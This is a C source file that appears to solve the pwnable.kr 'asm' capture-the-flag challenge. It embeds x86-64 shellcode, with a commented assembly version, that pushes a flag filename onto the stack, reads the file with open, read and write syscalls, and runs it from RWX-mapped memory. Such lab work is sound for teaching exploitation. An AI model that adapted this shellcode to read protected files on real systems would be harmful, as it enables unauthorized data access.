#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>

#define FNAME "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
char shellcode[] = "\x48\xb8\x6f\x30\x6f\x30\x6f\x6e\x67\x00\x50\x48\xb8\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x50\x48\xb8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x48\xb8\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x30\x30\x30\x30\x30\x6f\x6f\x6f\x50\x48\xb8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x48\xb8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x48\xb8\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x50\x48\xb8\x73\x5f\x76\x65\x72\x79\x5f\x6c\x50\x48\xb8\x65\x5f\x6e\x61\x6d\x65\x5f\x69\x50\x48\xb8\x5f\x74\x68\x65\x5f\x66\x69\x6c\x50\x48\xb8\x6c\x65\x2e\x73\x6f\x72\x72\x79\x50\x48\xb8\x5f\x74\x68\x69\x73\x5f\x66\x69\x50\x48\xb8\x61\x73\x65\x5f\x72\x65\x61\x64\x50\x48\xb8\x66\x69\x6c\x65\x5f\x70\x6c\x65\x50\x48\xb8\x6b\x72\x5f\x66\x6c\x61\x67\x5f\x50\x48\xb8\x70\x77\x6e\x61\x62\x6c\x65\x2e\x50\x48\xb8\x74\x68\x69\x73\x5f\x69\x73\x5f\x50\x48\xc7\xc0\x02\x00\x00\x00\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\xc7\xc2\x00\x04\x00\x00\x48\xc7\xc0\x00\x00\x00\x00\x0f\x05\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x01\x00\x00\x00\x48\x89\xe6\x0f\x05";
char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
char buf[1024];
int main() {
	char* sh = (char*)mmap((void*)0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));

	int offset = sizeof(stub);
	memcpy(sh+offset, shellcode, 1000);

	((void (*)(void))sh)();
	return 0;

/*
	__asm__ volatile (

		"mov $0x00676e6f306f306f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x306f306f306f306f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x3030303030303030, %rax\r\n"
		"push %rax\r\n"
		"mov $0x303030306f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f3030303030, %rax\r\n"
		"push %rax\r\n"
		"mov $0x3030303030303030, %rax\r\n"
		"push %rax\r\n"
		"mov $0x3030303030303030, %rax\r\n"
		"push %rax\r\n"
		"mov $0x303030306f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6f6f6f6f6f6f6f6f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6c5f797265765f73, %rax\r\n"
		"push %rax\r\n"
		"mov $0x695f656d616e5f65, %rax\r\n"
		"push %rax\r\n"
		"mov $0x6c69665f6568745f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x7972726f732e656c, %rax\r\n"
		"push %rax\r\n"
		"mov $0x69665f736968745f, %rax\r\n"
		"push %rax\r\n"
		"mov $0x646165725f657361, %rax\r\n"
		"push %rax\r\n"
		"mov $0x656c705f656c6966, %rax\r\n"
		"push %rax\r\n"
		"mov $0x5f67616c665f726b, %rax\r\n"
		"push %rax\r\n"
		"mov $0x2e656c62616e7770, %rax\r\n"
		"push %rax\r\n"
		"mov $0x5f73695f73696874, %rax\r\n"
		"push %rax\r\n"

		"mov $0x2, %rax\r\n"
		"mov %rsp, %rdi\r\n"
		"mov $0x0, %rsi\r\n"
		"mov $0x0, %rdx\r\n"
		"syscall\r\n" //open


		"mov %rax, %rdi\r\n"
		"mov %rsp, %rsi\r\n"
		"mov $0x400, %rdx\r\n"
		"mov $0x0, %rax\r\n"
		"syscall\r\n" //read

		"mov $0x1, %rax\r\n"
		"mov $0x1, %rdi\r\n"
		"mov %rsp, %rsi\r\n"
		"syscall" //write
	);
	*/
}

//http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/